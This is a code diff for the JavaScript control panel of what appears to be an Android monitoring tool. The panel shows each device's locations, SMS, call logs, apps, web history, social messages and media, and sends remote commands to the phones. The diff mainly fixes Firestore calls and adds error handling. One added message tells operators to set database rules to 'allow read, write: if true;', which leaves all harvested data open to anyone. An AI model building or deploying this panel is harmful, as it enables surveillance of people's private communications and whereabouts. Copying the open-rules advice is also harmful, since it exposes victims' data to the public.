@@ -28,7 +28,6 @@ let cachedData = {
     locations: []
 };
 
-// Subscriptions
 let unsubs = [];
 
 function initMap() {
@@ -47,9 +46,10 @@ window.addEventListener('DOMContentLoaded', () => {
 
 function showToast(msg) {
     const t = document.getElementById('toast');
+    if (!t) return;
     t.textContent = msg;
     t.style.display = 'block';
-    setTimeout(() => { t.style.display = 'none'; }, 3000);
+    setTimeout(() => { t.style.display = 'none'; }, 4000);
 }
 
 function listenForDevices() {
@@ -61,7 +61,7 @@ function listenForDevices() {
         });
 
         if (devices.length === 0) {
-            select.innerHTML = '<option value="">No devices registered yet</option>';
+            select.innerHTML = '<option value="">No devices registered yet in Firebase</option>';
             return;
         }
 
@@ -75,6 +75,9 @@ function listenForDevices() {
             selectedDeviceId = devices[0].id;
             switchDevice();
         }
+    }, err => {
+        console.error("Firestore Listen Devices Error:", err);
+        showToast("Firestore Permission Error: Check Firestore Rules in Firebase Console!");
     });
 }
 
@@ -83,7 +86,6 @@ function switchDevice() {
     selectedDeviceId = select.value;
     if (!selectedDeviceId) return;
 
-    // Unsubscribe previous device listeners
     unsubs.forEach(unsub => unsub());
     unsubs = [];
 
@@ -92,10 +94,10 @@ function switchDevice() {
 }
 
 function listenToDeviceHeader() {
-    const unsub = db.collection('devices').document(selectedDeviceId).onSnapshot(doc => {
+    const unsub = db.collection('devices').doc(selectedDeviceId).onSnapshot(doc => {
         if (!doc.exists) return;
         const d = doc.data();
-        const now = SystemMillis();
+        const now = Date.now();
         const isOnline = (now - (d.last_seen || 0)) < 300000; // 5 mins
 
         document.getElementById('hdrStatus').innerHTML = isOnline ?
@@ -106,76 +108,68 @@ function listenToDeviceHeader() {
         document.getElementById('hdrModel').textContent = `${d.manufacturer || ''} ${d.model || d.device_name || '—'}`;
         document.getElementById('hdrAndroid').textContent = d.android_version ? `Android ${d.android_version}` : '—';
         document.getElementById('hdrLastSeen').textContent = formatTime(d.last_seen);
-    });
+    }, err => console.error("Header listen error:", err));
     unsubs.push(unsub);
 }
 
 function listenToDataCollections() {
-    const limit = currentLimit;
+    const devRef = db.collection('devices').doc(selectedDeviceId);
 
     // Locations
-    unsubs.push(db.collection('devices').document(selectedDeviceId).collection('locations')
-        .orderBy('timestamp', 'desc').limit(50)
-        .onSnapshot(s => {
-            cachedData.locations = s.docs.map(d => d.data());
-            renderLocations();
-        }));
+    unsubs.push(devRef.collection('locations').limit(100).onSnapshot(s => {
+        cachedData.locations = s.docs.map(d => d.data()).sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
+        renderLocations();
+    }, err => console.error("Locations err:", err)));
 
     // Activity
-    unsubs.push(db.collection('devices').document(selectedDeviceId).collection('activity')
-        .orderBy('timestamp', 'desc').limit(limit)
-        .onSnapshot(s => {
-            cachedData.activity = s.docs.map(d => d.data());
-            renderActivityPanel();
-        }));
+    unsubs.push(devRef.collection('activity').limit(currentLimit).onSnapshot(s => {
+        cachedData.activity = s.docs.map(d => d.data()).sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
+        renderActivityPanel();
+    }, err => handleSubErr("Activity", err)));
 
     // SMS
-    unsubs.push(db.collection('devices').document(selectedDeviceId).collection('sms')
-        .orderBy('date', 'desc').limit(limit)
-        .onSnapshot(s => {
-            cachedData.sms = s.docs.map(d => d.data());
-            renderSMSPanel();
-        }));
+    unsubs.push(devRef.collection('sms').limit(currentLimit).onSnapshot(s => {
+        cachedData.sms = s.docs.map(d => d.data()).sort((a,b) => (b.date||0) - (a.date||0));
+        renderSMSPanel();
+    }, err => handleSubErr("SMS", err)));
 
     // Calls
-    unsubs.push(db.collection('devices').document(selectedDeviceId).collection('calls')
-        .orderBy('date', 'desc').limit(limit)
-        .onSnapshot(s => {
-            cachedData.calls = s.docs.map(d => d.data());
-            renderCallsPanel();
-        }));
+    unsubs.push(devRef.collection('calls').limit(currentLimit).onSnapshot(s => {
+        cachedData.calls = s.docs.map(d => d.data()).sort((a,b) => (b.date||0) - (a.date||0));
+        renderCallsPanel();
+    }, err => handleSubErr("Calls", err)));
 
     // Apps
-    unsubs.push(db.collection('devices').document(selectedDeviceId).collection('apps')
-        .orderBy('app_name', 'asc')
-        .onSnapshot(s => {
-            cachedData.apps = s.docs.map(d => d.data());
-            renderAppsPanel();
-        }));
+    unsubs.push(devRef.collection('apps').limit(500).onSnapshot(s => {
+        cachedData.apps = s.docs.map(d => d.data()).sort((a,b) => (a.app_name||'').localeCompare(b.app_name||''));
+        renderAppsPanel();
+    }, err => handleSubErr("Apps", err)));
 
     // Web History
-    unsubs.push(db.collection('devices').document(selectedDeviceId).collection('webhistory')
-        .orderBy('timestamp', 'desc').limit(limit)
-        .onSnapshot(s => {
-            cachedData.web = s.docs.map(d => d.data());
-            renderWebPanel();
-        }));
+    unsubs.push(devRef.collection('webhistory').limit(currentLimit).onSnapshot(s => {
+        cachedData.web = s.docs.map(d => d.data()).sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
+        renderWebPanel();
+    }, err => handleSubErr("Web", err)));
 
     // Social
-    unsubs.push(db.collection('devices').document(selectedDeviceId).collection('social')
-        .orderBy('timestamp', 'desc').limit(limit)
-        .onSnapshot(s => {
-            cachedData.social = s.docs.map(d => d.data());
-            renderSocialPanel();
-        }));
+    unsubs.push(devRef.collection('social').limit(currentLimit).onSnapshot(s => {
+        cachedData.social = s.docs.map(d => d.data()).sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
+        renderSocialPanel();
+    }, err => handleSubErr("Social", err)));
 
     // Media
-    unsubs.push(db.collection('devices').document(selectedDeviceId).collection('media')
-        .orderBy('timestamp', 'desc').limit(limit)
-        .onSnapshot(s => {
-            cachedData.media = s.docs.map(d => d.data());
-            renderMediaPanel();
-        }));
+    unsubs.push(devRef.collection('media').limit(currentLimit).onSnapshot(s => {
+        cachedData.media = s.docs.map(d => d.data()).sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
+        renderMediaPanel();
+    }, err => handleSubErr("Media", err)));
+}
+
+function handleSubErr(name, err) {
+    console.error(`${name} collection error:`, err);
+    const panel = document.getElementById(`panel-${name.toLowerCase()}`);
+    if (panel) {
+        panel.innerHTML = `<div class="empty-state" style="color:#ef4444;">⚠️ Firestore Error: ${esc(err.message)}<br><small>Make sure Firestore Rules are set to: <code>allow read, write: if true;</code> in Firebase Console.</small></div>`;
+    }
 }
 
 // Command Sender
@@ -184,12 +178,12 @@ function sendFirebaseCommand(commandType, params = {}) {
     const cmdDoc = {
         command_type: commandType,
         status: "pending",
-        created_at: SystemMillis(),
+        created_at: Date.now(),
         ...params
     };
-    db.collection('devices').document(selectedDeviceId).collection('commands').add(cmdDoc)
+    db.collection('devices').doc(selectedDeviceId).collection('commands').add(cmdDoc)
         .then(() => showToast(`Sent command: ${commandType}`))
-        .catch(e => showToast(`Failed: ${e.message}`));
+        .catch(e => showToast(`Command error: ${e.message}`));
 }
 
 // Render Functions
@@ -238,7 +232,7 @@ function renderActivityPanel() {
     updateBadges();
     const items = filterList(cachedData.activity, [a => a.app_name, a => a.package_name]);
     const panel = document.getElementById('panel-activity');
-    if (items.length === 0) { panel.innerHTML = '<div class="empty-state">No activity logs found</div>'; return; }
+    if (items.length === 0) { panel.innerHTML = '<div class="empty-state">No activity logs recorded yet</div>'; return; }
     panel.innerHTML = items.map((a, idx) => `
         <div class="activity-item">
             <div class="activity-row" id="act-row-${idx}" onclick="toggleRow('act', ${idx})">
@@ -420,7 +414,6 @@ function renderMediaPanel() {
     `).join('');
 }
 
-// Tab Switching
 function showTab(name) {
     document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
     document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
@@ -460,8 +453,6 @@ function onLimitChange() {
     if (selectedDeviceId) switchDevice();
 }
 
-// Helpers
-function SystemMillis() { return Date.now(); }
 function esc(str) { return str ? String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;') : ''; }
 function formatTime(ts) {
     if (!ts) return '—';
